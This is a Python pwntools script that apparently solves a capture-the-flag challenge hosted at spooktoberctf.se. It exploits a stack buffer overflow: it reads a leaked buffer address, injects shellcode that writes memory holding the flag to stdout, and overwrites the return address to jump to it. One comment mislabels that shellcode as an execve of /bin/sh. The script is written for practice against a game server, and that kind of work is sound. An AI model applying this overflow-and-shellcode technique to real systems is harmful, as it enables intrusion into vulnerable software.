#!/usr/bin/env python3
from pwn import *
import sys
import re

context.log_level = "ERROR"
context.arch      = 'amd64'
context.os        = 'linux'
context.word_size = 64
context.timeout   = 1

def conn():
    if args.LOCAL:
        return process("./program")
    else:
        return remote("spooktoberctf.se", 22062)


with conn() as c:
    # "Hey, write some stuff to 0xdeadbeef"
    stuff_addr_line = c.readline().decode('ascii')
    stuff_addr = int(re.sub("^.*0x([0-9a-f]+)$", r"\1", stuff_addr_line), 16)

    print("stuff_addr: %s" % (hex(stuff_addr)), file=sys.stderr)

    flag_addr=stuff_addr + 176
    flag_size=1024

    # rax sets which system call, 1 = write
    # rdi sets which file description, 1 = stdout
    # rsi sets memory address
    # rdx sets size
    payload = asm(f"""
        mov rdx,{ hex(flag_size) }
        mov rsi,{ hex(flag_addr ) }
        mov rax,1
        mov rdi,1
        syscall
    """, arch = 'amd64', os = 'linux')

    # Fill stuff with junk, i.e. 128 bytes + 8 bytes where gets return value would be placed
    junk_size = (128 + 8 - len(payload))
    payload += b"A" * junk_size
    # Overwrite return address to point to the address of stuff, i.e. the execve("/bin/sh")
    payload += p64(stuff_addr)

    print("payload[%i]: %s" % (len(payload), payload), file=sys.stderr)

    # Let's goo!
    c.sendline(payload)

    memory_dump = c.recvall()
    flag = memory_dump.split(b"\x00")[0]

    sys.stdout.buffer.write(flag)

    c.close()
